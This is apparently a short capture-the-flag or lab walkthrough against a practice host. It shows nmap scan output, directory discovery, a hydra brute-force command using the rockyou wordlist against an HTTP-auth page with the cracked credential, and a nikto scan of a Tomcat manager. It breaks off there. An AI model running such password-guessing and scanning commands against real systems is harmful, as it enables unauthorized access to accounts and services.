# nmap

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 11:49 IST
Warning: 10.10.48.190 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.48.190
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:f1:c2:7d:62:b5:e9:20:ea:ac:58:af:8c:58:0d:75 (RSA)
|   256 58:ed:06:48:38:15:a9:03:01:31:f8:b3:ac:cc:88:e6 (ECDSA)
|_  256 be:08:f4:ca:98:cf:c0:e9:b5:99:0a:e4:15:43:d1:dd (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
5940/tcp filtered unknown
8009/tcp open     ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



# gobusrer

found 2 directory `/protcted` `/guidelines`

used hydra to crack password

`hydra -l bob -P ~/Downloads/rockyou.txt 10.10.48.190 http-get /protected`

`bob:bubbles`

used nikto to find dir

`nikto -id bob:bubble -h  http://10.10.48.190:1234/manager/html`